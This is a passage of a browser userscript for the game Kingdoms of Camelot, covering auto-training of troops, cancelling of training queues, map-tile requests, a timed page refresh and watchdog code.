	m+='<TR><td style="border-bottom:1px solid black"><SELECT class='+city+' id="Resource'+city+'" disabled><option value="true">'+culang.keeps+'</options>';
	m+='<option value="false">'+culang.use+'</option>';
	m+='</select><td colspan=6  style="border-bottom:1px solid black"><img width=23 src="'+IMGfood+'">&nbsp;';
	m += '<INPUT class='+city+'  id="KeepFood'+city+'" type=text size=7 maxlength=8 value="'+ AutoTrainOptions.Keep[city]['Food']+'"\>&nbsp;';
	m += '<img width=23 src="'+IMGwood+'">&nbsp;';
	m += '<INPUT class='+city+' id="KeepWood'+city+'" type=text size=7 maxlength=8 value="'+ AutoTrainOptions.Keep[city]['Wood']+'"\>&nbsp;';
	m += '<img width=23 src="'+IMGstone+'">&nbsp;';
	m += '<INPUT class='+city+'  id="KeepStone'+city+'" type=text size=7 maxlength=8 value="'+ AutoTrainOptions.Keep[city]['Stone']+'"\>&nbsp;';
	m += '<img width=23 src="'+IMGore+'">&nbsp;';
	m += '<INPUT class='+city+' id="KeepOre'+city+'" type=text size=7 maxlength=8 value="'+ AutoTrainOptions.Keep[city]['Ore']+'"\>&nbsp;';
	m += '</td><td  style="border-bottom:1px solid black"></td></tr>';
    }
    m+="</table><table width=100% class=pdxTab border=0><tr><td>";
	
	    m+="&nbsp;<INPUT id=autoTrainModes type=submit value='"+culang.mode+"'> <select id=TrainMode>";
    for (r=2; r<13; r++){
     m+= "<option value='"+r+"'>"+unsafeWindow.unitcost['unt'+r][0]+"</option>";
    }
    m+="</select> - "+culang.predefinedTrain+": <select id=AutoTrainMode><option value=25>25%</option><option value=50>50%</option><option value=75>75%</option><option value=100>100%</option></select> - <input type=button value='"+culang.filltroops+"' id=AllCalculate>";	   
    m+="<BR><input type=checkbox id=AutoTrainCancelFirst> "+culang.cancelTraining+" - <input type=button value='"+culang.cancelTR+"' id=ATCancelAll> <span id='AutoTrainLog'></span></td></tr></table>";
	
    t.cont.innerHTML = m; 
    for (i=0;i<Seed.cities.length;i++){            city = i+1;            document.getElementById('Resource'+city).value = AutoTrainOptions.Resource[city];            document.getElementById('workers'+city).value = AutoTrainOptions.Workers[city];     }
    document.getElementById('AutoTrainMode').value=AutoTrainOptions.UnitMixValue;
    document.getElementById('AutoTrainMode').addEventListener('change', function(e){      AutoTrainOptions.UnitMixValue=document.getElementById('AutoTrainMode').value;      saveAutoTrainOptions();    },false);
    document.getElementById('AllCalculate').addEventListener('click', function(){        for (var c=0; c<Cities.numCities; c++) {cityId=Cities.cities[c].id;                 t.ATchangeUnits(cityId,document.getElementById("autoFType_"+cityId).value);       	}    } , false);
	document.getElementById('pbAutoTrainState').addEventListener('click', function(){		t.toggleAutoTrainState(this);    }, false);
    document.getElementById('autoTrainSave').addEventListener('click', t.saveATrainOpt , false);
    document.getElementById('autoTrainModes').addEventListener('click', function(){t.predefinedTrainMode()} , false);
    document.getElementById('ATCancelAll').addEventListener('click', function(){t.AT_CancelAll()} , false);
    t.dispStatus = document.getElementById('AutoTrainLog');
	 var k=0;
    for (var c=0; c<Cities.numCities; c++) {  k=c+1;
		document.getElementById('workers'+k).addEventListener('change', function(e){	      	    AutoTrainOptions.Workers[e.target['className']] = e.target.value;	      	    saveAutoTrainOptions();  	}, false);
    	document.getElementById('Resource'+k).addEventListener('change', function(e){    			AutoTrainOptions.Resource[e.target['className']] = e.target.value;         		saveAutoTrainOptions();		}, false);
		document.getElementById('KeepFood'+k).addEventListener('change', function(e){			if (isNaN(e.target.value)) e.target.value=0 ;            AutoTrainOptions.Keep[e.target['className']]['Food'] = e.target.value;            saveAutoTrainOptions();      	}, false);
      	document.getElementById('KeepWood'+k).addEventListener('change', function(e){      	    if (isNaN(e.target.value)) e.target.value=0 ;            AutoTrainOptions.Keep[e.target['className']]['Wood'] = e.target.value;            saveAutoTrainOptions();      	}, false);
      	document.getElementById('KeepStone'+k).addEventListener('change', function(e){			if (isNaN(e.target.value)) e.target.value=0 ;            AutoTrainOptions.Keep[e.target['className']]['Stone'] = e.target.value;            saveAutoTrainOptions();      	}, false);
      	document.getElementById('KeepOre'+k).addEventListener('change', function(e){  if (isNaN(e.target.value)) e.target.value=0 ;            AutoTrainOptions.Keep[e.target['className']]['Ore'] = e.target.value;            saveAutoTrainOptions();	}, false);
    } 
  
	 },
 Start: function() {
  var t = Tabs.AutoTrain;
  if (!AutoTrainOptions.Running) {  clearInterval(t.timer);   return;  }
  if (t.numcity<Cities.numCities-1) {  t.numcity++;  } else {  t.numcity=0; }
  var c=t.numcity;
  var cityId=Cities.cities[c].id;
  if (!AutoTrainOptions.listactif[cityId]) t.Start();
  var populationdispo = 0;
  if(!AutoTrainOptions.listlabour[cityId]) {
   populationdispo = parseInt(Seed.citystats['city'+cityId].pop[0]) - parseInt(Seed.citystats['city'+cityId].pop[3]);	
  }else {
    populationdispo = parseInt(Seed.citystats['city'+cityId].pop[0]).toFixed(0);
  }
  var availableTrainingSlots = 0;
  try{
   	var barracksTotal = getCityBuilding(cityId, 13).count;
   	var trainingSlotsUsed = Seed.queue_unt['city'+cityId].length;
   	if(trainingSlotsUsed!=null){var availableTrainingSlots = barracksTotal-trainingSlotsUsed; 	}
   }finally{ } 
   maxunite = t.unitemax(cityId, AutoTrainOptions.list[Cities.cities[c].id],(c+1));
   var resources = t.checkresources(cityId, c);
   if (!resources) {
    if (document.getElementById('autoFError_'+cityId)) document.getElementById('autoFError_'+cityId).innerHTML ="<span title='"+culang.pop+": "+populationdispo+" - "+culang.max+" "+culang.troops+": "+maxunite+" - "+culang.TTleftslots+": "+availableTrainingSlots+"'>\
      <b>"+culang.notEnaughResource+"</b></span>";
    return;
   }  
   if(availableTrainingSlots>0 && maxunite>=parseInt(AutoTrainOptions.unitemin[Cities.cities[c].id]) && AutoTrainOptions.listactif[Cities.cities[c].id]) {
       var unitId = AutoTrainOptions.list[cityId];
       var num = parseInt(maxunite);
       if (AutoTrainOptions.unitemax[Cities.cities[c].id] != undefined) {
        var maxnum = AutoTrainOptions.unitemax[Cities.cities[c].id];
        if (num>parseInt(AutoTrainOptions.unitemax[Cities.cities[c].id])) num=parseInt(AutoTrainOptions.unitemax[Cities.cities[c].id]);
       }
       if (document.getElementById('autoFError_'+cityId)) document.getElementById('autoFError_'+cityId).innerHTML=" "+num+" "+unsafeWindow.unitcost['unt'+ AutoTrainOptions.list[Cities.cities[c].id]][0]+"";
      //if (document.getElementById('autoFError_'+cityId)) actionLog('Lancement '+num+' '+unsafeWindow.unitcost['unt'+ AutoTrainOptions.list[Cities.cities[c].id]][0]+' ');

       var gam= AutoTrainOptions.listboost[cityId];
    
       var time = unsafeWindow.modal_barracks_traintime(unitId, num);
         var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
         params.cid = cityId;
         params.type = unitId;
         params.quant = num;
         params.items = 0;
         params.gambleId = gam;
         new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/train.php" + unsafeWindow.g_ajaxsuffix, {
           method: "post",
           parameters: params,
           onSuccess: function(rslt) {
             if (rslt.ok) {
               
               var resourceFactors=[],resourceLost;
	              if(gam!=null){
	                time=rslt.timeNeeded;
	       	      }
	               for(var i=1;i<5;i++){
	               if(rslt.gamble){
	                resourceFactors.push(rslt.gamble[i.toString()]);
	               }else{
	               resourceFactors.push(1);
	               }
					resourceLost=parseInt(unsafeWindow.unitcost["unt"+unitId][i])*3600*parseInt(num);resourceLost=resourceLost*resourceFactors[i-1];
					unsafeWindow.seed.resources["city"+cityId]["rec"+i][0]=parseInt(unsafeWindow.seed.resources["city"+cityId]["rec"+i][0])-resourceLost;
					}
					unsafeWindow.seed.citystats["city"+cityId].gold[0]=parseInt(unsafeWindow.seed.citystats["city"+cityId].gold[0])-parseInt(unsafeWindow.unitcost["unt"+unitId][5])*parseInt(num);
					unsafeWindow.seed.citystats["city"+cityId].pop[0]=parseInt(unsafeWindow.seed.citystats["city"+cityId].pop[0])-parseInt(unsafeWindow.unitcost["unt"+unitId][6])*parseInt(num);
					unsafeWindow.seed.queue_unt["city"+cityId].push([unitId,num,rslt.initTS,parseInt(rslt.initTS)+time,0,time,null]);
			 
				if(rslt.updateSeed) { unsafeWindow.update_seed(rslt.updateSeed) }
	
               if (document.getElementById('autoFError_'+cityId)) document.getElementById('autoFError_'+cityId).innerHTML+=" <BR><span class=boldGreen>"+culang.actionGold2+"</span>";
             } else {
              if (document.getElementById('autoFError_'+cityId)) document.getElementById('autoFError_'+cityId).innerHTML+=" <BR><span class=boldRed>"+culang.error+"</span>";
             }
           },
           onFailure: function(o) {
            if (document.getElementById('autoFError_'+cityId)) document.getElementById('autoFError_'+cityId).innerHTML+=" <BR><span class=boldRed>"+culang.error+"</span>";
           }
  	});
       
   } else {
     if (document.getElementById('autoFError_'+cityId)) document.getElementById('autoFError_'+cityId).innerHTML =" <span title='"+culang.pop+": "+populationdispo+" - "+culang.max+" "+culang.troops+": "+maxunite+" - "+culang.TTleftslots+": "+availableTrainingSlots+"'><BR><span class=boldRed>"+culang.notpossible+"</span></span>";
   }

 },
 unitemax : function(currentcityid, e, numcity){
 var gamble = AutoTrainOptions.listboost[currentcityid];
 var mult=1;
 if (gamble==0) mult=1;
 if (gamble==1) mult=2;
 if (gamble==2) mult=4;
 var b=new Array();
 var a=new Array();
 for(var d=1;d<5;d++){ b.push((parseInt(unsafeWindow.unitcost["unt"+e][d])*3600)*mult);  a.push(parseInt(unsafeWindow.seed.resources["city"+currentcityid]["rec"+d][0])) }
  b.push((parseInt(unsafeWindow.unitcost["unt"+e][5]))*mult);
  a.push(parseInt(unsafeWindow.seed.citystats["city"+currentcityid].gold[0]));
  b.push((parseInt(unsafeWindow.unitcost["unt"+e][6])));

  if (!AutoTrainOptions.listlabour[currentcityid]) { a.push(parseInt(unsafeWindow.seed.citystats["city"+currentcityid].pop[0])-parseInt(unsafeWindow.seed.citystats["city"+currentcityid].pop[3]));  } else {    a.push(parseInt(unsafeWindow.seed.citystats["city"+currentcityid].pop[0])-parseInt(unsafeWindow.seed.citystats["city"+currentcityid].pop[3])+ parseInt((parseInt(unsafeWindow.seed.citystats["city"+currentcityid].pop[3])*(AutoTrainOptions.Workers[numcity]/100))));}  
  var c=a[0]/b[0];
  for(var d=1;d<b.length;d++) { if(parseInt(b[d])!=0) { c=Math.min(c,a[d]/b[d]) } }
  return parseInt(c)||0
 },
  hide : function (){   var t = Tabs.AutoTrain;    t.saveATrainOpt();  },
  ATchangeUnits: function(cityId,unit) {
   var t = Tabs.AutoTrain;
   var countpop= unsafeWindow.unitcost['unt'+unit][6];
   var numcity=Cities.byID[cityId].idx+1;
   var X = Seed.citystats['city'+cityId]["pop"][1];
   var Y = unsafeWindow.seed.citystats["city"+cityId].pop[3];
   var Q= countpop;
   var Z = 0;
   var M = document.getElementById("AutoTrainMode").value/100;
   if (document.getElementById("autoFWorkers_"+cityId).checked) {
      
      Z = AutoTrainOptions.Workers[numcity]/100;     
      document.getElementById("aFunitemax_"+cityId).value = parseInt(X/Q);

   } else {
    Z = 0;
    document.getElementById("aFunitemax_"+cityId).value=(X-Y)/Q;
   }
   var Min =((X-(Y*(1-Z)))*M)/Q;
    if (Min<0) Min=0;
   document.getElementById("aFunitemin_"+cityId).value = parseInt(Min);
   if (document.getElementById("aFunitemax_"+cityId).value<0) { document.getElementById("aFunitemax_"+cityId).value=0;document.getElementById("aFunitemin_"+cityId).value =0; }
   
  },
  show : function (){  var t = Tabs.AutoTrain;  },
    checkresources : function(cityId, city){
  	var t = Tabs.AutoTrain;
  	var city=city+1;
  	t.food = parseInt((Seed.resources['city'+cityId].rec1[0]/3600) - AutoTrainOptions['Keep'][city]['Food']);
  	t.wood = parseInt((Seed.resources['city'+cityId].rec2[0]/3600) - AutoTrainOptions['Keep'][city]['Wood']);
  	t.stone = parseInt((Seed.resources['city'+cityId].rec3[0]/3600) - AutoTrainOptions['Keep'][city]['Stone']);
  	t.ore = parseInt((Seed.resources['city'+cityId].rec4[0]/3600) - AutoTrainOptions['Keep'][city]['Ore']);
  	if(t.food>0 && t.wood>0 && t.stone>0 && t.ore>0){
  		return true;
  	}
  	return false;
  },
  CancelActionall: function(numville, num, fintraitement) {
    
     var t = Tabs.AutoTrain;
  
     var cityId = Cities.cities[numville].id;
     var q = Seed.queue_unt['city'+cityId];
     var now = unixTime();
     
     start = q[num][2];
     end = q[num][3];
     if (first)
           actual = end - now;
        else
            actual = end - lastEnd;
     if (actual < 0)
            actual = 0;
       
     var param2=cityId; // id de la ville
     var param3=q[num][0]; // Type de trouoe
     var param4=q[num][1]; // Qte troupe
     var param5=end; // debut
     var param6=start; // fin
     var param7=actual; // duree
        
     var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
          params.cityId = param2;
          params.requestType ="CANCEL_TRAINING";
          params.numtrptrn = param4;
          params.trnETA= param5;
          params.trnNeeded = param7;
          params.trnTmp = param6;
          params.typetrn= param3;
      
       new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/cancelTraining.php" + unsafeWindow.g_ajaxsuffix, {
               method: "post",
               parameters: params,
             onSuccess: function (rslt) {
              var t = Tabs.AutoTrain;
              if (rslt.ok) {
                 unsafeWindow.update_seed_ajax(true,function(){
     	       var k=0;for(var j=0;j<unsafeWindow.seed.queue_unt["city"+param2].length;j++){
     	        if(j>num){
     	         unsafeWindow.seed.queue_unt["city"+param2][j][2]=parseInt(rslt.dateTraining[k]["start"]);
     	         unsafeWindow.seed.queue_unt["city"+param2][j][3]=parseInt(rslt.dateTraining[k]["end"]);
     	         k++;
     	         }
     	        }
     	        unsafeWindow.seed.queue_unt["city"+param2].splice(num,1);
     	        for(var i=1;i<5;i++){
     	         var totalReturn=parseInt(unsafeWindow.unitcost["unt"+param3][i])*parseInt(param4)*3600/2;
     	         unsafeWindow.seed.resources["city"+param2]["rec"+i][0]=parseInt(unsafeWindow.seed.resources["city"+param2]["rec"+i][0])+totalReturn;
     	        }
     
         	});
                t.crfil++;
  
  		// progression :
  		document.getElementById('AutoTrainLog').innerHTML = "<b><i>"+culang.que+": " + t.crfil+ " / " +t.nbfil +"</i></b>";
  
  	        var numnew = num - 1;
  	        if (numnew<fintraitement) {
		  		 if (numville==Cities.numCities) {
		  		  document.getElementById('AutoTrainLog').innerHTML = "<font color=#880000><B>"+culang.starttournamenttrain+"</b></font>";
		  		  return;
		  		 }
		  		 numville++;
		  		   		 var cityId = Cities.cities[numville].id;
				 		 var q = Seed.queue_unt['city'+cityId];
				   		 numnew=q.length-1;
				   		if (q.length<=fintraitement) {
				   		 document.getElementById('AutoTrainLog').innerHTML = "<font color=#550000><B>"+culang.tryagain+"</b></font>";
				   		 return;
		  		}
		  		 setTimeout(function (){
				    t.CancelActionall(numville, numnew, fintraitement);
		  		 }, (Math.random()*100)+100 );
		  	        } else {
		  	          setTimeout(function (){
		  	            t.CancelActionall(numville, numnew, fintraitement);
		  		  }, (Math.random()*100)+100 );
                 } 
               
              } else {
               document.getElementById('AutoTrainLog').innerHTML = "<font color=#550000><B>"+culang.canttrainRefresh+"</b></font>";
              }
             },
             onFailure: function (rslt) {
              var t = Tabs.AutoTrain;
              document.getElementById('AutoTrainLog').innerHTML = "<font color=#550000><B>"+culang.canttrainRefresh+"</b></font>";
             }
      });
      
  },
  AT_CancelAll: function() {
   var t = Tabs.AutoTrain;
   t.nbfil=0;
   t.crfil=0;
   var debutsup = 1;
   if ( document.getElementById('AutoTrainCancelFirst').checked) {  
    var debutsup=0 ;
   }
    for(i=0; i<Cities.numCities; i++) {
     var cityId = Cities.cities[i].id;
     var q = Seed.queue_unt['city'+cityId];
     t.nbfil += q.length - debutsup;
    }
   for(i=0; i<Cities.numCities; i++) {
    var cityId = Cities.cities[i].id;
    var q = Seed.queue_unt['city'+cityId];
    if (q.length>debutsup) {
     obj = document.getElementById('pbAutoTrainState');
     AutoTrainOptions.Running = false;
     if (obj) obj.value =  culang.autotrain+" = "+culang.buttonoff;
     saveAutoTrainOptions();
    t.CancelActionall(i, q.length-1, debutsup);
     //actionLog("Auto Ausbildung abgebrochen bei "+i + " / " + t.nbfil + " - Warteschlange #"+ (q.length-1) +" - "+ debutsup);
     return false;
    }
   }
  },
  predefinedTrainMode: function() {
   var t = Tabs.AutoTrain;
   var typeunit = document.getElementById('TrainMode').value;
   var countpop= unsafeWindow.unitcost['unt'+typeunit][6];
   for (var c=0; c<Cities.numCities; c++) {    
    cityId=Cities.cities[c].id;  
    document.getElementById("autoFCheck_"+Cities.cities[c].id).checked=true;
    document.getElementById("autoFType_"+Cities.cities[c].id).value=typeunit;
    var pop = parseInt(parseInt(Seed.citystats['city'+cityId]["pop"][1]/countpop) / document.getElementById("AutoTrainMode").value);
    document.getElementById("autoFWorkers_"+Cities.cities[c].id).checked=true;
	t.ATchangeUnits(cityId,document.getElementById("autoFType_"+cityId).value);
   }
   t.saveATrainOpt();
  },
  saveATrainOpt: function() {
     var t = Tabs.AutoTrain;
     document.getElementById('autoTrainSave').style.backgroundColor="#F18888";
     AutoTrainOptions.timelauch=document.getElementById('aFtimelauch').value;
     AutoTrainOptions.UnitMixValue=document.getElementById('AutoTrainMode').value;
     for (var c=0; c<Cities.numCities; c++) {
        AutoTrainOptions.list[Cities.cities[c].id] = document.getElementById('autoFType_'+Cities.cities[c].id).value;
        AutoTrainOptions.listactif[Cities.cities[c].id] = document.getElementById('autoFCheck_'+Cities.cities[c].id).checked;
        AutoTrainOptions.listlabour[Cities.cities[c].id] = document.getElementById('autoFWorkers_'+Cities.cities[c].id).checked;
        AutoTrainOptions.unitemin[Cities.cities[c].id]=document.getElementById('aFunitemin_'+Cities.cities[c].id).value;
        AutoTrainOptions.unitemax[Cities.cities[c].id]=document.getElementById('aFunitemax_'+Cities.cities[c].id).value;
        AutoTrainOptions.listboost[Cities.cities[c].id]=document.getElementById('autoFboost_'+Cities.cities[c].id).value;
     }
     saveAutoTrainOptions();
     setTimeout(function() {  document.getElementById('autoTrainSave').style.backgroundColor="";  }, 600);
  },
toggleAutoTrainState: function(obj){var t = Tabs.AutoTrain;  if (AutoTrainOptions.Running == true) { AutoTrainOptions.Running = false; clearInterval(t.timer);  obj.value = culang.autotrain+" = "+culang.buttonoff; saveAutoTrainOptions();  } else {  AutoTrainOptions.Running = true; t.timer=setInterval(t.Start,parseInt(AutoTrainOptions.timelauch*1000));  obj.value = culang.autotrain+" = "+culang.buttonon;	saveAutoTrainOptions();    }  saveAutoTrainOptions();  },

}
/************************************************************************************
*						KOC POWER - TABS CHAT										*
************************************************************************************/
if(!false) eval(GM_getResourceText( 'TABS_CHAT' ));
/************************************************************************************
*						KOC POWER - TABS WEBSITES									*
************************************************************************************/
if(!false) eval(GM_getResourceText( 'TABS_WEBSITE' ));
/*********************************************************************************
                   KOC POWER - TABS END 
*********************************************************************************/

/************************************************************************************
*						KOC POWER - FUNCTIONS										*
************************************************************************************/
function CMapAjax (){
  this.normalize = normalize;  
  this.request = request;

  function request (left, top, width, notify){    
    var left = parseInt(left / 5) * 5;
    var top = parseInt(top / 5) * 5;
    var width = parseInt((width+4) / 5) * 5;
    
    var blockString = generateBlockList(left, top, width);
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    params.blocks = blockString;
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/fetchMapTiles.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        notify(left, top, width, rslt);
      },
      onFailure: function (rslt) {
        notify(left, top, width, rslt);
      }
    });
    function generateBlockList (left, top, width) {
      var width5 = parseInt(width / 5);
      var bl = [];
      for (x=0; x<width5; x++){
        var xx = left + (x*5);
        if (xx > 745)
          xx -= 750;
        for (y=0; y<width5; y++){
          var yy = top + (y*5);
          if (yy > 745)
            yy -= 750;
          bl.push ('bl_'+ xx +'_bt_'+ yy);
        }
      }
      return bl.join(",");
    }
  }
 
  function normalize  (x){
    if ( x >= 750)
      x -= 750;
    else if (x < 0)
      x += 750;
    return parseInt (x/5) * 5;
  }
}
function pdxkoordlink (x, y){
  var m = [];
  m.push ('(<a title="'+culang.gotoCoord+'" onclick="pdxGotoMapHide (');
  m.push (x);
  m.push (',');
  m.push (y);
  m.push ('); return false">');
  m.push (x);
  m.push (',');
  m.push (y);
  m.push ('</a>)');  
  return m.join('');
}
unsafeWindow.pdxGotoMapHide = function (x, y){
  try {
    unsafeWindow.Modal.hideModal();
  } catch (e){ }
  try {
    Modal.hideModal();
  } catch (e){ }
  unsafeWindow.pdxGotoMap (x, y);  
}

unsafeWindow.pdxGotoMap = function (x, y){
  if (Options.hideOnGoto)
    hideMe ();
  setTimeout (function (){
    document.getElementById('mapXCoor').value = x;
    document.getElementById('mapYCoor').value = y;
    unsafeWindow.reCenterMapWithCoor();
    var a = document.getElementById("mod_views").getElementsByTagName("a");
    for (var b = 0; b < a.length; b++) {
        a[b].className = ""
    }
    document.getElementById('mod_views_map').className = "sel";
    document.getElementById("maparea_city").style.display = 'none';
    document.getElementById("maparea_fields").style.display = 'none';
    document.getElementById("maparea_map").style.display = 'block';
    unsafeWindow.tutorialClear()
  }, 0);
};
/************************************************************************************
*						KOC POWER - ALLIANCE REPORTS								*
************************************************************************************/
if(!false) eval(GM_getResourceText( 'PLUGIN_ALLIANCEBATTLERPT' ));
/************************************************************************************
*						KOC POWER - GOLD COLLECTOR									*
************************************************************************************/
if(!false) eval(GM_getResourceText( 'PLUGIN_GOLDCOLLECTOR' ));
/************************************************************************************
*						KOC POWER - REFRESH EVERY									*
************************************************************************************/
var RefreshEvery  = {
  timer : null,
  PaintTimer : null,
  NextRefresh : 0,
  box : null,
  target : null,

  init : function (){
    var t = RefreshEvery;
	t.creatediv();
	if (Options.pbEveryMins < 1)
        Options.pbEveryMins = 1;
    RefreshEvery.setEnable (Options.pbEveryEnable);
  },
  
  creatediv : function(){
    var t = RefreshEvery;
	t.target = document.getElementById('comm_tabs');
	if(t.target == null){
		setTimeout(t.creatediv, 2000);
		return;
	}
	t.box = document.createElement('div');
	t.target.appendChild(t.box);
	t.box.id = "pdxQuickInfos";
	t.box.setAttribute("style", pdxQuickInfos);
  },
  
  setEnable : function (tf){
    var t = RefreshEvery;
    clearTimeout (t.timer);
    if (tf) {
      t.timer = setTimeout (t.doit, Options.pbEveryMins*60000);
      t.NextRefresh = unixTime() + (Options.pbEveryMins*60); 
      t.PaintTimer = setTimeout (t.Paint, 5000);

    } else {
        t.PaintTimer = null;
		t.timer = null;
		t.NextRefresh = 0;
		if (Options.pbChatOnRight==true) t.box.innerHTML = '<center><B>&nbsp;&nbsp;&nbsp;&nbsp;'+ getMyAlliance()[1] + ' (<span class=pdxQuickInfoData>' + getServerId() +'</span>)</b></center>';
		if (Options.pbChatOnRight==false) t.box.innerHTML = '<B>&nbsp;&nbsp;&nbsp;&nbsp;'+ getMyAlliance()[1] + ' (<span class=pdxQuickInfoData>' + getServerId() +'</span>)</b>';
t.box.setAttribute("style", pdxQuickInfos);
		}
  },
  
  doit : function (){
    actionLog ('<b>'+culang.arefresh+'</b> ('+ Options.pbEveryMins +' '+culang.actionAutoRefresh +')');
    reloadKOC();
  },
  
  setTimer : function (){
    var t = RefreshEvery;
    clearTimeout (t.timer);
    if (Options.pbEveryMins < 1) Options.pbEveryMins = 1;
    RefreshEvery.setEnable (Options.pbEveryEnable);
  },
  
  Paint : function(){
     var t = RefreshEvery;
	 if(t.timer == null) return;
     now = unixTime();
	 if (Options.pbChatOnRight==false) var text = '<B>&nbsp;&nbsp;&nbsp;&nbsp;'+ getMyAlliance()[1] + ' (<span class=pdxQuickInfoData>' + getServerId() +'</span>)</b>';	
	 if (Options.pbChatOnRight==true) var text = '<B>&nbsp;&nbsp;&nbsp;&nbsp;'+ getMyAlliance()[1] + ' (<span class=pdxQuickInfoData>' + getServerId() +'</span>)</b>';	 
     var Left = (t.NextRefresh - now);
     if ( Left < 0) Left = 0;
     if ( Left < 60) text += ' <b>- '+culang.Refreshin+'</b>: <span class=pdxQuickInfoData>'+ timestr(Left) +'</span></div>';
     else text += ' <b>- '+culang.Refreshin+'</b>: <span class=pdxQuickInfoData>'+ timestr(Left) +'</span></div>';
     t.box.innerHTML = text;
	 t.box.setAttribute("style", pdxQuickInfos);
     t.PaintTimer = setTimeout (t.Paint, 1000);
  },
}
if (Options.pbChatOnRight==false) { var pdxQuickInfos = "color:#141516; font-variant:small-caps; background-image:none;"; }
if (Options.pdxBackgroundStyle=="pdxBackground11" && Options.pbChatOnRight==true) {	var pdxQuickInfos = "color:#FFF; font-variant:small-caps; background-image:url("+Options.devBG+"); -moz-border-radius:3px; border:1px solid #141516; -moz-box-shadow: 0 0 3px 3px #FFF; width:360px; ";}

if (Options.pbChatOnRight==true) { var pdxQuickInfos = "color:"+Colors.pdxQuickInfoFont+"; font-variant:small-caps; background-image:url("+Options.pdxQuickInfoBG+");  -moz-border-radius:3px; border:1px solid #141516; -moz-box-shadow: 0 0 3px 3px #FFF; width:360px; "; }

if (Options.pbChatOnRight==true && Options.pdxBackgroundStyle=="pdxBackgroundColor" || Options.pdxBackgroundStyle=="pdxOwnBackground") { var pdxQuickInfos = "font-variant:small-caps; background-image:url("+Options.pdxQuickInfoBG+");  -moz-border-radius:3px;  -moz-box-shadow: 0px 0px 3px 3px #141516; color: #FFF; width:360px;"; }
//if (Options.pbChatOnRight==false &&  Options.pdxBackgroundStyle=="pdxBackgroundColor" || Options.pdxBackgroundStyle=="pdxOwnBackground"  ) { var pdxQuickInfos = "font-variant:small-caps; background-image:none; border:none; color: #141516; "; }

if (Options.pbChatOnRight==true && Options.pdxBackgroundStyle=="pdxOwnBackgrounddark" || Options.pdxBackgroundStyle=="pdxBackgroundColordark"  ) { var pdxQuickInfos = "font-variant:small-caps; background-image:url("+Options.pdxQuickInfoBG+");  -moz-border-radius:3px;  -moz-box-shadow: 0 0 3px 3px #FFF; color: #FFF; width:360px; "; }
//if (Options.pbChatOnRight==false && Options.pdxBackgroundStyle=="pdxOwnBackgrounddark" || Options.pdxBackgroundStyle=="pdxBackgroundColordark"  )  { var pdxQuickInfos = "font-variant:small-caps; background-image:none; border:none; color: #141516;  "; }

if (Options.pdxBackgroundStyle=="pdxKoCOld" && Options.pbChatOnRight==true) { var pdxQuickInfos = "font-variant:small-caps; background-image:url("+Options.pdxQuickInfoBG+"); -moz-border-radius:3px;  -moz-box-shadow: 0 0 3px 3px #141516; color: #FFF; width:360px; "; }

/************************************************************************************
*						KOC POWER - FAIRIE KILLER									*
************************************************************************************/
if(!false) eval(GM_getResourceText( 'PLUGIN_FAIRIEKILLER' ));

/********** facebook watchdog: runs only in 'http://apps.facebook.com/kingdomsofcamelot/*' instance!  ******/
function facebookWatchdog (){
  var INTERVAL = 50000; // wait 50 seconds minute before checking DOM
  if (!GlobalOptions.pbWatchdog)
    return;
  setTimeout (watchdog, INTERVAL);
  function watchdog (){    try {      if (document.getElementById('app_content_130402594779') == null){        logit ("KOC NOT FOUND!");        KOCnotFound(5*60);      }    } catch (e){      logit ("KOC NOT FOUND!");      KOCnotFound(4*60);    } }
}

function kocWatchdog (){
  var INTERVAL = 10000; // wait 30 seconds before checking DOM
  if (!GlobalOptions.pbWatchdog)
    return;
  setTimeout (watchdog, INTERVAL);
  function watchdog (){logit ("KOC WATCHDOG: "+ document.getElementById('mod_maparea'));    if (document.getElementById('mod_maparea')==null){      logit ("KOC not loaded");      KOCnotFound(20);    }  }
}

function KOCnotFound(secs){
  var div;
  var countdownTimer = null;
  var endSecs = (new Date().getTime()/1000) + secs;

  div = document.createElement('div');
  div.innerHTML = '<DIV style="font-size:18px; background-color:#a00; color:#fff"><CENTER><BR> '+culang.kocpwrErr+'<BR>\
      Refreshing in <SPAN id=pbwdsecs></span><BR><INPUT id=pbwdcan type=submit value="'+culang.cancel+' '+culang.refresh+'"><BR><BR></div>';
  document.body.insertBefore (div, document.body.firstChild);
  document.getElementById('pbwdcan').addEventListener('click', cancel, false);
  countdown();

  function countdown (){
    var secsLeft = endSecs - (new Date().getTime()/1000);
    document.getElementById('pbwdsecs').innerHTML = timestr(secsLeft);
    if (secsLeft < 0)
    reloadKOC();
    countdownTimer = setTimeout (countdown, 1000);
  }
  function cancel (){    clearTimeout (countdownTimer);    document.body.removeChild (div);  }
}

var WideScreen = {
  chatIsRight : false,  useWideMap : false,  rail : null,

  init : function (){
    t = WideScreen;
    if (GlobalOptions.pbWideScreen){
      t.rail = searchDOM (document.getElementById('mod_maparea'), 'node.className=="maparea_rrail"', 10);
      GM_addStyle ('.modalCurtain {width:760px !important} .mod_comm_mmb{z-index:0 !important;}');
      try {
        document.getElementById('progressBar').parentNode.removeChild(document.getElementById('progressBar'));
        document.getElementById('crossPromoBarContainer').parentNode.removeChild(document.getElementById('crossPromoBarContainer'));
      } catch (e) {  }
    }
  },

  setChatOnRight : function (tf){
    t = WideScreen;
    if (tf == t.chatIsRight || !GlobalOptions.pbWideScreen)
      return;
    if (tf){
      var chat = document.getElementById('kocmain_bottom').childNodes[1];
      if (!chat || chat.className!='mod_comm')
        setTimeout (function (){t.setChatOnRight(tf)}, 1000);

